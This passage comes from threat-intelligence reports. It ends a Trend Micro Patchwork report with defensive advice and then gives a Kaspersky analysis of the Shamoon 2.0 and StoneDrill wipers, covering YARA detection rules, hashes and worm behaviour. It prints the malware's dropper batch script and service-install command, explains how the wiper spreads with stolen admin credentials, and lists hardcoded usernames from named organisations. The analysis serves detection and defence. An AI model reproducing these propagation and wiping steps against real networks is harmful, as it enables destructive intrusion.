and\n \nthen militaryreviews[.]net for a week\n. \nThis\n \nis consistent wi\nth the three months of \n\nsimilar to legitimate websites \nthat \nrequire authentication. We also found one server \nthat \nwas not hosting \nany \ncontent\n \nbut had\n \na Postfix instance running and\n \nbeing \nused \nto send \ntargeted emails. \n \nAll of these servers seem\n \nto\n \nuse Apache on CentOS. \n \nThe favicon on a server they recently used was still \nsimilar to \n\nage to facilitate \nserver installation when using a Windows environment.\n \nThe domain names are always registered using a service protecting the related whois information, which \n\nwere disclosed\n \nin 2016. Addi\ntionally, many of the \ndomain names published in previous reports have been either \nsinkholed\n \nby security companies or \nabandoned by the attackers.\n \n \n\nthese \ntools \nare \nused\n, the likelier \nit is for them to \nbe incorporated in\nto\n \n\nFor enterprises, t\nhe \ngamut of tools and techniques at Patchwork\n\narraying proactive defense to thwart threats at each level\n\nfrom the \ngateways, endpoints\n, and \nnetworks\n \nto \nservers\n. \n \nWhat can enterprises do? Keep the operating \nsystem\n \nand its applications \nupdated\n\nor employ \nvirtual \npatching\n \nfor legacy systems\n\nto prevent security gaps and deter attackers from exploiting them. \nF\nirewall\n, \nsandbox\n,\n \nand \nintrusion detection and prevention \nsystems\n \nhelp detect red flags in the network. Enforce \nthe principle of least privilege: blacklist and \nsecure the use of tools\n \nusually reserved for system \nadministrators, such as \nPowerShell\n. \nNet\nwork segment\nation\n \nand \ndata categorization\n \nthwart lateral \nmovement and risk of further data theft, while behavior monitoring \nand \napplication control/whitelisting\n \nblock anomalous\n \nroutines executed by suspicious files. And more importantly, \nsecure the email gateway\n. \n\n-\nand\n-\ntested\n\nit only \ntakes \none\n \nsusceptible layer to affect the wh\nole chain. \n \n \n \n \n \n \n \n \n  \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nTrend Micro Incorporated, a global leader in security software, strives to make the \nworld safe for exchanging digital information. Our innovative solutions for consumers, \nbusinesses and governments provide layered \ncontent security to protect information \non mobile devices, endpoints, gateways, servers and the cloud. All of our solutions \nare powered by cloud\n-\n\n\nhreat experts around the \nglobe. For more information, visit\n \nwww.trendmicro.com\n. \n \n\u00a9201\n7\n \nby Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend \nMicro t\n-\nball logo are trademarks or registered trademarks of Trend Micro, \nIncorporated. All \nother product or company names may be trademarks or registered \ntrademarks of their owners.\n \n ", "FROM SHAMOON TO STONEDRILL \nWipers attacking Saudi organizations and beyond\n Beginning in November 2016, Kaspersky Lab observed a new wave of wiper attacks \ndirected at \nmultiple targets in the Middle East. The malware used in the new attacks was a variant of the \ninfamous \nShamoon\n \nworm\n \nthat targeted Saudi Aramco and Rasgas back in 2012. \n \nDormant for four years, one of the mo\nst mysterious wipers in history has returned.\n \nSo far, we \nhave \nobserved three waves of attacks of the Shamoon 2.0 malware, activated on 17 \nNovember 2016, 29 November 2016 and 23 January 2017.\n \nAlso known as Disttrack, Shamoon is a highly destructive malware \nfamily that effectively wipes \nthe victim machine. A group known as the \nCutting Sword of Justice\n \ntook credit for the Saudi \nAramco attack by posting a \nPastebin\n \nmessage on the day of the attack (back in 2012)\n,\n \nand \njustified the attack as a measure against the Saudi monarchy.\n \nThe\n \nShamoon 2.0 attacks observed\n \nsince November 2016 have targeted\n \norganizations in \nvarious critical and economic sectors in Saudi Arabia. Just like the previous variant, the \nShamoon 2.0 wiper a\nims for the mass destruction of systems inside targeted organizations. \nThe new attacks share \nmany\n \nsimilarities with the 2012 wave, though featuring new tools and \ntechniques. During the first stage, the attackers obtain administrator credentials for the vi\n\nnetwork. Next, they build a custom wiper (Shamoon 2.0) which leverages these credentials to \nspread wide\nly\n \ninside the organization. Finally, on a predefined date, the wiper activates\n,\n \n\ninoperable\n. It should b\ne noted that the final stages \nof the attacks have their activity completely automated, without the need for communication with \nthe \ncommand and control center.\n \nWhile \ni\nnvestigating the Shamoon 2.0 attacks, Kaspersky Lab also discovered a previously \nunknown w\n\ncalling this new wiper \nStoneDrill\n\n,\n \nwith \nmultiple interesting factors and techniques to allow for \nthe \nbetter evasion of d\netection. In \naddition to suspected Saudi targets, one victim of StoneDrill was observed on the Kaspersky \nSecurity Network (KSN) in Europe. This makes us believe the threat actor behind StoneDrill is \nexpanding \nits \nwiping operations from the Middle East to E\nurope.\n \nTo summarize some of the characteristics of the new wiper attacks, for both Shamoon and \nStoneDrill:\n \nShamoon 2.0 includes a fully functional ransomware module, in addition to its common\nwiping functionality.\nShamoon 2.0 has both 32\n-\nbit and 64\n-\nbit co\nmponents\n.\nThe Shamoon samples we analyzed in January 2017 do not implement any command\nand control (C&C) communication; previous ones included a basic C&C functionality that\n\nStoneDrill \nmakes heavy use\n \nof evasion techniques to avoid sandbox execution\n.\nWhile Shamoon embeds Arabic\n-\nYemen resource language sections, StoneDrill embeds\nmostly Persian resource language sections. Of course, we do not exclude the possibility\nof false flags.\n \n \nStoneDrill does not u\nse drivers during deployment (unlike Shamoon) \nbut\n \nrelies on \n\n \n\n \nSeveral similarities exist between Shamoon and StoneDrill\n.\n \n\n \nMultiple similarities were found between StoneDrill and previo\nusly analysed \nNews\nB\neef \nattacks\n.\n \n \nWhat is new in this report?\n \nThis report provides new insights into the Shamoon 2.0 and StoneDrill attacks, including: \n \n1.\n \nThe discovery\n \ntechniques and strategies we used for Shamoon and StoneDrill\n.\n \n \n2.\n \nDetails on the ransomware functionality found in Shamoon 2.0. This functionality is \ncurrently inactive but could be used in future attacks\n.\n \n3.\n \nDetails on the \nnewly found \nStoneDrill functions, including \nits \ndestructive capabilities \n(even with limited user privileges)\n.\n \n4.\n \nDetails on \nthe \nsimilarities between malware styles and malware components\n\n \nsource \ncode found in Shamoon, StoneDrill and NewsBeef\n.\n \n \n \n 1. From Shamoon to StoneDr\nill: the discovery \n \n\n \nFew people ever expected the return of Shamoon after \nfour \nyears of silence. This made the \nnews from the Middle East on 17 November 2016 quite surprising\n,\n \nand sent multiple \nshock\nwaves \nthrough \nthe industry. After the second wave of attacks, which took place on 29 \nNovember 2016, it became quite clear that Shamoon 2.0 was no longer \nan isolated\n \nincident, but \npart of a new series of attacks and\n \nwe should\n \nexpect more waves coming\n \nin\n. In order to make\n \nsure \nthat \nKaspersky Lab customers \nwere \nprotected, we started to develop specific detection \nstrategies and hunt for possible new variants.\n \nTo create the new detections, we used multiple ideas:\n \n\n \nThe Shamoon wipers have their additional payloads stored as \nencrypted resources.\n \n\n \nJust like in 2012, the early Shamoon 2.0 samples used resources with \nthree \nvery \nspecific names \n-\n \n\"PKCS7\", \"PKCS12\" and \"X509\". Because of their uniqueness it was \nrelatively easy to find and detect them just by the resource names \nand th\neir \nhigh \nentropy. Unfortunately, newer versions had random resource names like \"ICO\", \"LANG\" \nand \"MENU\", so the ability to easily find new samples was lost.\n \nHowever, all programmers, especially malware writers, have their own habits, and the authors \nof \nSha\nmoon are no exception:\n \n\n \nSince the Shamoon 1\n.0\n \nstory\n,\n \nfrom 2012 (6dd571b84470ad9caad30a6a6acf491e)\n \nuntil\n \n2016 (2cd0a5f1e9bcce6807e57ec8477d222a) many samples had one \nadditional \nencrypted resource with a specific, although non\n-\nunique name \"101\".\n \nThis finding \ngot us thinking\n \nthat\n \nthe Shamoon attackers can re\n-\n\ninvestigated ways of using this to hunt for new, unknown malware generations from their side.\n \nAs researchers, we tested a lot of different approaches to \nfind similar malicious \nsam\nples based \non this \nartefact\n\ndetection:\n \n1.\n \nWe assumed that for \nthe \nnext waves of attack the authors \nwould \ncontinue to recompile \nthe \nShamoon 2\n.0\n \nversion from 2016, while trying to avoi\nd AV detection, so we focused \nmostly on the newest Shamoon versions\n.\n \n2.\n \nWe assumed that the wiper \nwould \nagain enumerate all files inside folders, so it \nw\nould \nstill \ncall Windows API functions FindFirstFile and FindNextFile\n.\n \n3.\n \nBecause \nit uses\n \nencrypted resources,\n \nwe assumed that it would find and load them with \nthe Windows API functions FindResource and LoadResource\n.\n \n4.\n \nInside all known \nversions of \nShamoon 2\n.0\n, the resource \"101\"  was found, with the \nfollowing properties:\n \n\n \nLevel of entropy > 7.8 \n-\n \nthat means the data \ninside is encrypted or compressed\n.\n \n\n \nSize about 30 \nKB \n-\n \n\n.\n \n\n \nLanguage = neutral (not set); all other resources had \nthe \nlanguages \"Arabic \n(Yemen)\" or \"English United States\"\n.\n \n\n \nDoes not contain an unencrypted PE execu\ntable file inside\n.\n \n After initial testing, we decided to add more search criteria to limit the number of possible false \npositive detections:\n \n\n \nShamoon samples had no digital signature, so the sample would be unsigned\n.\n \n\n \nAll known Shamoon samples with resource \n\"101\" had a maximum file size of 370 KB, so \nit's reasonable to limit the file size to twice that number \n-\n \n700 KB.\n \n\n \nThe number of resources inside the sample should not be too high \n-\n \nless than 15\n.\n \nOur favorite malware hunting tool, \nYara\n, provides a rule\n-\nbused approach to create descriptions of \nmalware families based on textual or binary patterns\n. \n \n\n \nimport \"pe\"\n \nimport \"math\"\n \n \nrule susp_file_enume\nrator_with_encrypted_resource_101 {\n \nmeta:\n \n \n \ncopyright = \"Kaspersky Lab\"\n \n \ndescription = \"Generic detection for samples that enumerate files with encrypted resource \ncalled 101\"\n \n \nhash = \"2cd0a5f1e9bcce6807e57ec8477d222a\"\n \n \nhash = \"c843046e54b755ec63ccb09d0a689\n674\"\n \n \nversion = \"1.4\"\n \n \nstrings:\n \n \n \n$mz = \"This program cannot be run in DOS mode.\"\n \n \n \n$a1 = \"FindFirstFile\" ascii wide nocase\n \n \n$a2 = \"FindNextFile\" ascii wide nocase\n \n \n$a3 = \"FindResource\" ascii wide nocase\n \n \n$a4 = \"LoadResource\" ascii wide nocase\n \n \ncondition:\n \n \n \nuint16(0) == 0x5A4D and\n \n \nall of them and\n \n \nfilesize < 700000 and\n \n \npe.number_of_sections > 4 and\n \n \npe.number_of_signatures == 0 and\n \n \npe.number_of_resources > 1 and pe.number_of_resources < 15 and\n \n \nfor any i in (0..pe.number_of_resources \n-\n \n1):\n \n \n(\n \n(math.entro\npy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and \n \n \n \npe.resources[i].id == 101 and\n \n \n \npe.resources[i].length > 20000 and\n \n \n \npe.resources[i].language == 0 and\n \n \n \nnot ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))\n \n \n)\n \n}\n \n \n While running the above Yara rule on Kaspersky \n\nsamples selection\n, we found an \ninteresting, fresh sample. After a quick analysis, we realized it was yet another wiper\n. H\nowever, \nit was not Shamoon\n,\n \n\n \n \n1.2. From StoneDrill to \nNewsBeef\n \nHaving identified the StoneDrill sample through the Yara technique above, we started looking \nfor other possibly related samples.\n \nOne Yara technique that \nhas \npr\noved useful in the past for finding new malware variants is the \ndevelopment of Yara rules for decrypted malware components. During attacks, malware \n\n,\n \nso\n \nhunting for decrypted \nmalware code might he\nlp in finding new malware variants or even older samples.\n \n\nYara rules for a decrypted StoneDrill module:\n \n \nrule StoneDrill_main_sub {\n \nmeta:\n \n    \nauthor    \n \n= \"Kaspe\nrsky Lab\"\n \n    \ndescription   = \"Rule to detect StoneDrill (decrypted) samples\"\n \n    \nhash       \n \n= \"d01781f1246fd1b64e09170bd6600fe1\"\n \n    \nhash       \n \n= \"ac3c25534c076623192b9381f926ba0d\"\n \n    \nversion   \n \n= \"1.0\"\n \n \nstrings:\n \n \n    \n$code = {B8 08 00 FE 7F FF 30 8F 4\n4 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF \n30 8F 44 24 ?? 8B ?? 24 [1 \n-\n \n4] 2B ?? 24 [6] F7 ?1 [5 \n-\n \n12] 00}\n \n \ncondition:\n \n \n    \nuint16(0) == 0x5A4D and\n \n    \n$code  and\n \n    \nfilesize < 5000000\n \n}\n \n \nInterestingly, this rule allowed us to find a new \ncategory of samples, which we previously \nconnected with a threat actor named News\nB\neef. We wrote about \nNews\nB\neef\n \nroughly one year \nago, in relation to another set of a\nttacks against oil and energy companies from the Middle East.\n \n \nFurther analysis indicated the malware samples from StoneDrill and News\nB\neef appear to be \nconnected together through numerous internal similarities.\n \n The use of simple logic in conjunction with \na \nknowledge of Yara can help attain \na \nstate\n-\nof\n-\nthe\n-\nart \noutcome in malware hunting activity. If you would like to learn more, you can join us \nfor \nthe Yara \ntraining \"\nHunt \nAPTs with Yara like a GReAT Ninja\n\nMalware Reverse \nEngineering course\n\n \nApril 1\n-\n2, 2017 in St. Maarten.\n \nSeveral private intelligence reports on Shamoon,\n \nStoneDrill and NewsBeef are available to \nsubscribers of \n\n. \n \nFor more information please contact: \nintelreports@kaspersky.com\n \n \n \n  \n2. Technical details \n-\n \nShamoon 2.0 \n-\n \nlanguage \nusage and possible Yemeni links\n \nSeveral good technical articles on Shamoon 2.0 \nhave been \npublished by some of our \ncolleagues\n, including \nPalo Alto\n, \nIBM X\n-\nForce\n, \nSymantec\n \nand others.\n \nThroughout this blog we describe some of the technical details of the new Shamoon 2.0 attacks \nand what are the most important things that make them stand out. For the analysis we used the \nearlie\nst set of samples\n,\n \nwith \na \nhardcoded attack date of 17 November 2016\n. H\n\nalso included details\n \nfrom the newer samples\n, such as hardcoded credentials.\n \n\nt\nhrough a Windows Batch file with the following content:\n \n \n@echo off\n \nset u100=ntertmgr32.exe\n \nset u200=service\n \nset u800=%~dp0\n \ncopy /Y \"%u800%%u100%\" \"%systemroot%\n\\\nsystem32\n\\\n%u100%\" start /b %systemroot%\n\\\nsystem32\n\\\n%u100% \n%u200%\n \n \n\nsuggesting the attackers might be from Yemen. Of course, we should not \ndisregard\n \nthe\n \npossibility that the resource language could be a false flag planted there by the att\nackers.\n \n \n \n2.1. 32\n-\nbit Shamoon dropper/worm (ntssrvr32.exe)\n \nSHA256\n \n394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\n \nMD5\n \n5446f46d89124462ae7aca4fce420423\n \nCompiled\n \n2009.02.15 12:31:44 (GMT), VC 2010\n \nType\n \nI386 Console EXE\n \nSize\n \n1 349 632 \nbytes\n \n This executable is a worm designed to infect computers connected \nto \na Windows domain. To \nachieve this, it relies on a list of hardcoded, previously stolen username/password pairs \nbelonging to administrators of the targeted domain. All the strings in\n \nthe malware are obfuscated \nwith simple \none \nbyte ADD operations and are decrypted upon execution. All the dropped files \n\nkernel32.dll\n. The module only works if it \nis run with exactly one command line \nparameter, regardless of the parameter. Otherwise, it \nsimply exits (likely a measure to avoid accidental execution).\n \n \nThe hardcoded credentials we \nhave \nobserved so far are:\n \nDomain name\n \nUsername\n \nDomain name\n \nUsername\n \nDomain \nname\n \nUsername\n \nGACA\n \ngacaadmin15\n \nCRISTALGLOBAL\n \nckadmin\n \nSAICO\n \nadministrator\n \n \ngacaadmin22\n \n \njaladmin\n \n \nmuneeb\n \n \ngacaadmin08\n \nSADARA\n \nmukhsx01\n \n \nbeadmin\n \n \nAdministrator\n \n \npgSCMADM      \n \n \ncrmadmin\n \nALAB.local\n \nadmin\n \n \nmnxxnadmin\n \n \ntvcenter\n \n\n \nsaud.a2\n \n \nthirnx01\n \n \nkhaleel\n \n \nHabib1\n \n \npamadmin1\n \n \nmhamdi\n \n \nsys\n \n \nshokax00\n \n \nmawale\n \n \nalqifaria\n \n \nbackupadmn\n \n \nspadmin\n \n \ncloudsvc\n \nSIDF\n \nadministrator\n \nSCSB\n \nqomari.a\n \nSIPA\n \nucam01\n \n \nshabbir\n \n \nsts\n \n \nadministrator\n \n \ntsfarooq\n \n \naalshamari\n \n \nbbadmin\n \n \nCLIUSR\n \n \nnbu_service\n \n \nCUCMUser\n \n \nadministrator\n \nRIYADH\n \nfaxserver\n \n \nUnityDirSvc\n \n \nemail4\n \n \ncitrbass\n \n \nUnityMsgStoreSvc\n \nYAMSTEEL\n \nAdministrator\n \n456\n \ntest456\n \nTESTDOMAIN\n.COM\n \ntest123\n \n \nyidadm\n \n \n \n \n\nPROCESSOR_ARCHITECTURE\n\nAMD64\n\n \n\namd64\n\n-\nbit variant. The variant is contained within a resource \n \n-\nXORed and dropped onto the system under: \n<\n%WindowsDir%\n\\\nsystem32\n\\\nntssrvr64.exe>\n.\n \n \nIt is then installed as a service via the command:\n \n\nexe /c \"ping \n-\nn 30 127.0.0.1 >nul && sc config NtsSrv binpath= \n\"C:\n\\\nWINDOWS\n\\\nsystem32\n\\\nntssrvr64.exe LocalService\" && ping \n-\n\n \n \n2.1.1. Installation as a Service\n \nIf the malware is running on a 32\n-\nbit system, this module in\nstalls itself as a service named \n\n \nName\n \nDisplay Name\n \nDescription\n \nNtsSrv\n \nMicrosoft Network Realtime \nInspection Service\n \nHelps guard against time change attempts targeting known \nand newly discovered vulnerabilities in network time protocols\n \n \nThe \n\n\nservice to allow it to start after the malware.\n \n \n2.1.2. Worm Functionality\n \nOnce\n \nthis module runs (as a service), the worm\n-\nspreading functionality is started\n,\n \ntargeting\n \nevery network host within the IPv4 address range\n,\n \nwith the same first \nthree \n\nIP and the last byte in the range from 0 to 255, thus operating insid\ne subnet class C (a.b.c.0/24).\n \n\n \n1.\n \n\nthe \nLocalAccountTokenFilterPolicy\n \nregistry key value to 1 in \nHKEY_LOCAL_MACHINE\n\\\nSOFTWARE\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersio\nn\n\\\nPolicies\n\\\nsystem.\n \n2.\n \nIf the RemoteRegistry system service is disabled and doesn't run on the target system, \nthe worm reconfigures this service to be auto\n-\nstarted and then starts it immediately. If \nthe connection to a remote registry is unsuccessful, the worm\n \nrepeats the connection \nattempt with a hardcoded set of stolen domain administrator credentials. The worm then \n\n\\\nwindows\n\\\nsystem32\n\\\ncsrss.exe\n\n\nADMIN$\n\", \n\"\nC$\n\", \"\nD$\n\", \"\nE$\n\".\n \n \n 3.\n \nOnce a remote system32 folder is found, the worm copies itself into this folder under the \n\nntssrvr32.exe\n\nntssrvr32.exe LocalService\n\nafter 90 seconds.\n \n4.\n \nIf the remote scheduler is inaccessible, the \nworm tries to set up NtsSrv and runs the \nservice on the remote machine with the same parameters as it used for self\n-\ninstallation. \nAttempts with stolen credentials are also performed.\n \n5.\n \nAn \nalternative \nbut similar infection method is coded in\nto\n \nthe worm, where\n \neach infection \nis performed in a separate thread without relying on the scheduler; but it is not used at \nthis time.\n \n \n2.1.3. Command and Control (C&C) Module\n \nAfter replication, the malware runs a command\n-\nand\n-\ncontrol communication module. This \nmodule is \n\nPkcs7\n\n-\nXORed and dropped as \n<\n%WindowsDir%\n\\\nsystem32\n\\\nnetinit.exe>\n. Using the hardcoded credentials, it creates a \nWindows Task Scheduler job that executes netinit.exe 90 seconds after creation. It waits 95 \nseconds \nand then deletes the scheduled job.\n \n \n2.1.4. Wiper and Encryptor Module\n \n\nrun the main payload. The activation period can be set in two ways:\n \n1.\n \nIt checks if the syst\nem time is not earlier than the time specified in the following file: \n<%windir%\n\\\ninf\n\\\nusbvideo324.pnf>\n \n2.\n \n\ndate:\n \n<20:45, 17 Nov 2016>\n \nAt the specified time, the malware d\nrops \ntwo \nfiles:\n \nThe first file, \n<c:\n\\\nwindows\n\\\ntemp\n\\\nkey8854321.pub>\n \nis unused in this attack and contains a \npublic encryption key. This is an indicator that the attackers might be using \nShamoon as a \nransomware tool \nin upcoming waves.\n \n \n\n-----\nBEGINPUBLICKEY\n-----\n \nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAusZItknNNeV+xjPzIZLyB5m6gaNREC6I3CZQ7F1vDU\nCaGki83s6JVDo2NGN70mhx4q5NJrgXDzD7McpxDoJsDkKwr5mm3yEs9vmZwHcEWcvU6QbJguFgPJk6zoatVq0\nWsfIkN50ywQMVq2zmiJel2UoalPJzCWbAYG0BShXjnlcsfV8GcPW+fNRCSG\nKVue3RE6cV5HlAjSD8VSk4KERPu\nWfvbk/pP0qDE60Uc7K3Bl7uxbHVB2g8unuj8B9d81TKT0hForie8V2N4FT0bdAHUHU6LT/XtAdLCp9/cTUf8zk1MC\noxXj6CSg9xKgGgnJazC/u3R0nm/pPriF/ZkwrVhJtDd/1nf4JC1sDmc3mgv0hI+7hthf+fZkv75doHg67Gg6JOZQIMytQ\neF8ylnUgC1ZyrAmaxN0OV69zhktzZISdmmkbtyZSHEZzIdC\n9PF/MJzCK5ylkEI2jQpAabgv34o2o+ZMJLSDZbNrXy9\n0LUy8GjtzJYmv02MVLjy7CSgglIbulSgMP4QC/i1fTIPhlSlMyCKnGIKdKY31KFQnoOzI8kudeted8eF/ubpFcna0TDc\nEk+Dt8s4pN4/DsGQoncWg9HMyC8Q/MWIE/JuOCisovJ0PYq2aKetDNRMm7THcXalXKD9RpczObRWKGKzMJD\nonmBm2AETME74MRPmC/FWgsCAwEAAQ==\n \n-----\nENDPUBLICKEY\n-----\n\n \n  \n\nPKCS12\n\n-\nXORed and dropped into \nthe %system% directory with a name randomly selected from \nthe \nfollowing list:\n \n \ncaclsrv.exe\n \ndvdquery.exe\n \nmsinit.exe\n \nsigver.exe\n \nwcscript.exe\n \ncertutl.exe\n \nevent.exe\n \nntfrsutil.exe\n \nrouteman.exe\n \nntnw.exe\n \nclean.exe\n \nfindfile.exe\n \nntdsutl.exe\n \nrrasrv.exe\n \nnetx.exe\n \nctrl.exe\n \ngpget.exe\n \npower.exe\n \nsacses.exe\n \nfsutl.exe\n \ndfrag.exe\n \nipsecure.exe\n \nrdsadmin.exe\n \nsfmsc.exe\n \nextract.exe \n \ndnslookup.exe\n \niissrv.exe\n \nregsys.exe\n \nsmbinit.exe\n \n \n \nThe dropped payload is then scheduled to run in the same way as the C&C communication \nmodule. We describe it in detail below.\n \n \n2.2. 64\n-\nbit Shamoon Dropper (ntssrvr64.exe)\n \nSHA256\n \n47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\n \nMD5\n \n8fbe990c2d493f58a2afa2b746e49c86\n \nCompiled\n \n2009.02.15 12:32:19 (GMT), VC 2010\n \nType\n \nAMD64 Console EXE\n \nSize\n \n717 312 bytes\n \n \nThis dropper \nhas \nthe same functionality as the 32\n-\nbit variant.\n \nThis version is contained within a \n\nX509\n\n-\nXORed and dropped onto the system under: \n<%WindowsDir%\n\\\nsystem32\n\\\nntssrvr64.exe>\n.\n \n \n2.2.1. C&C Communication Module (netinit.exe)\n \nSHA256\n \n61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842\n \nMD5\n \n5bac4381c00044d7f4e4cbfd368ba03b\n \n Compiled\n \n2009.02.15 12:29:20 (GMT), VC 2010\n \nType\n \nI386 Console EXE\n \nSize\n \n159 744 bytes\n \n \nSHA256\n \n772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5\n \nMD5\n \nac4d91e919a3ef210a59acab0dbb9ab5\n \nCompiled\n \n2009.02.15 12:29:41 (GMT), VC 2010\n \nType\n \nAMD64 Console EXE\n \nSize\n \n183 808 bytes\n \n \nThe strings in the C&C module are obfuscated by simple ADD ope\nrations and are decrypted \nupon execution. This module periodically connects to \na\n \nC&C with the following URL:\n \nhxxp://server/category/page.php?\nshinu=\nw74K9/xQp1VjJfwwadq4HCl7VheuQXk49YnNkb\nXR+0ghrH YIRFE51FQskZya+jIPqo3VlOEpfvvgxvO26pZ3oA==\n \n\nserver\n\n \n1.\n \nIt is used by mistake.\n \n2.\n \n\n \n3.\n \nA server with this name might be installed by the attackers somewhere inside the local \nnetwork.\n \n4.\n \nThe local network may rely on a now poisoned DNS server.\n \n \n\nshinu=\n\ntransliteration of the Gulf Arabic slang word \n\n\n\n \nfor \n\nwhat?\n\nThis particular slang is used in \nseveral c\n\nparameter string contains the following encoded information about the victim system:\n \n\n \nHost IP and MAC addresses\n \n\n \nWindows version information\n \n\n \nWindows input locale IDs (keyboard layo\nuts)\n \n\n \nNumber of connection attempts, or content of the \n<%WINDIR%\n\\\ninf\n\\\nnetimm173.pnf>\n \nfile \nif the file exists. The \n<netimm173.pnf>\n \nfile contains information about changes made by \nthe wiper payload module.\n \n \nIf the direct connection fails, this module tries to \nconnect using a hardcoded proxy \nserver \nof\n \n\ninclude a working C&C and the operators used a raw, unconfigured C&C module.\n \n Data received from the C&C server is handled\n \nin two possible ways:\n \n1.\n \nAn executable file is downloaded as \n<%TEMP%\n\\\nTemp\n\\\nfiler%rndDigits%.exe>\n \nand \nexecuted immediately thereafter.\n \n2.\n \nA file is dropped in \n<%WINDIR%\n\\\ninf\n\\\nusbvideo324.pnf>\n \nthat contains the wiper \n\ns the attackers to configure the wiper \ntime \nbomb\n.\n \n \n2.2.2. Disk Wiper/Encryptor Module\n \nSHA256\n \n128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\n \nMD5\n \n2cd0a5f1e9bcce6807e57ec8477d222a\n \nCompiled\n \n2009.02.15 12:30:19 (GMT), VC 2010\n \nType\n \nI386 \nConsole EXE\n \nSize\n \n282 112 bytes\n \n \nSHA256\n \nc7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n \nMD5\n \nc843046e54b755ec63ccb09d0a689674\n \nCompiled\n \n2009.02.15 12:30:41 (GMT), VC 2010\n \nType\n \nAMD64 Console EXE\n \nSize\n \n327 680 bytes\n \n \nDespite the wide\nspread\n \ncoverage of the resurgence of the Shamoon wiper, few have noted the \nnew ransomware functionality. The wiper module of Shamoon 2.0 has been designed to run as \neither a wiper or an encryptor (ransomware). \n \n1.\n \nThe module is configured to wipe the disk usi\n\nDeath of Alan Kurdi\n\npicture depicts a three\n-\nyear\n-\nold Syrian refugee who drowned as his family attempted to \nreach Europe and \ntravel on\n \nto Canada. The module can also be co\nnfigured to wipe the \ndisk using random data.\n \n2.\n \n\n-\nrandom RC4 key is generated, \nwhich is further encrypted by the RSA public key and stored directly on the hard drive (at   \n<\n\\\nDevice\n\\\nHarddisk0\n\\\nPartition0>)\n \nstarti\nng at offset 0x201, right after the master boot \nrecord.\n \n3.\n \nOnce the module is extracted, it drops a legitimate driver named \n<DRDISK.SYS>\n \nto the \ndisk and starts it. This driver is used for low\n-\nlevel disk operations and is well known from \n previous Shamoon attacks. Before accessing this driver, the system date is changed to \na random day \nbetween\n \nthe \n1st \nand \n20th of Aug\nust\n, 2012 to fool the dri\n\nchecks and evaluation period.\n \n4.\n \nThe payload employs the file \n<%WINDIR%\n\\\ninf\n\\\nnetimm173.pnf>\n \nto keep track of the \noperations performed. The content of this file is sent to the C&C server by the \ncommunication module.\n \n5.\n \nThe strings in this module are \nalso obfuscated by simple ADD operations and decrypted \nat start.\n \n \n2.2.3. Payload Configuration\n \n \nThere are two 25\n-\nbyte length configuration strings in the wiper payload:\n \n\n \n\nSPPPPPPPPPMPPHHHHHHHHHHBO\n\n \n\n \n\nNNNNNNNNNNWNNNNNNNNNNNWWW\n\n \nLetters in the first string \nspecify a type of operation to be performed, with the available operations \nexplained below. The second string designates how these operations should be performed: the letter '\nN\n' \nmeans that the operation will be executed synchronously in separate threads, t\nhe letter '\nW\n' means the \noperation will wait until a previous step is completed.\n \n\n \nLetter\n \nOperation\n \nS\n \nThe first operation, marked by the letter '\nS\n' wipes (or encrypts) the content of the Shamoon \n2\n.0\n \ncomponents (netinit.exe, ntssrvr32.exe, and wiper module itself). Using the low\n-\nlevel disk \naccess driver makes it possible to wipe the body of a running executable.\n \nP\n \nThe next 9 '\nP\n' letters indicate wiping (or encrypting) of the files placed inside the t\nraditional \nuser folders: desktop, download, document, desktop, download, document, picture, video, \nand music.\n \nM\n \nThe '\nM\n' wipes (or encrypts) the NTFS MFT data on all accessible drives mapped from A: to \nZ:, except the system drive.\n \nP\n \nThe next two '\nP\n' lette\nrs wipe (or encrypt) files inside the following folders: \n<C:\n\\\nWindows\n\\\nSystem32\n\\\nDrivers> and <C:\n\\\nWindows\n\\\nSystem32\n\\\nConfig\n\\\nsystemprofile>\n \nH\n \nThe 10 '\nH\n' letters wipe (or encrypt) \nsome \nof the partitions from 9 to 0 on hard disks 9\n-\n0 \n(SystemBoot and FirmwareBootD\nevice partitions and partition 0 on the system drive are \nskipped \nin \nthis step)\n \nB\n \nThe '\nB\n' letter wipes (or encrypts) part of the partition designated as FirmwareBootDevice\n \nO\n \nThe final '\nO\n' wipes (or encrypts) the Master File Table on the system drive, the first sector of \n\\\nDevice\n\\\nHarddisk0\n\\\nPartition0, and the \nlast \npart of the SystemBootDevice partition.\n \n \nTwo minutes after all tasks are completed, the system is rebooted with the following c\nommand: \n\nshutdown \n-\nr \n-\nf \n-\nt 2\n\n \n  \n2.2.4. Low\n-\nLevel Disk Access Driver (DRDISK.SYS)\n \nSHA256\n \n4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6\n \nMD5\n \n1493d342e7a36553c56b2adea150949e\n \nCompiled\n \n2011.12.28 16:51:24 (GMT), VC 2005\n \nType\n \nI386 Native\n \nSize\n \n27 280 bytes\n \n \nSHA256\n \neaee62a8238189e8607b24c463a84c83c2331a43b034484972e4b302bd3634d9\n \nMD5\n \n42f883d029b47f9d490a427091da3f5d\n \nCompiled\n \n2011.12.28 16:51:29 (GMT), VC 2005\n \nType\n \nAMD64 Native\n \nSize\n \n31 998 bytes\n \n \nThese signed legitimate drivers \nform\n \npart of the \nEldoS RawDisk product\n. This product is \ndesigned to provide direct access to disks and protected files from user\n-\nmode applications. \nSadly, this functionality has been adopted and abused by multiple threat \nactors to develop wiper \nmalware, as in the case of the original \nShamoon\n \nor the \nLazarus Destover\n \nmalware used in the \ninfamous Sony Pictures Entertainment attack of 2014. In order to bypass the EldoS RawDisk \n\nto a random day \nbetween the\n \n1st \nand\n \n20th of Aug\nust\n, 20\n12.\n \n2.3. From Shamoon 2.0 to StoneDrill 1.0\n \nStoneDrill has some style similarities to the previously discovered Shamoon 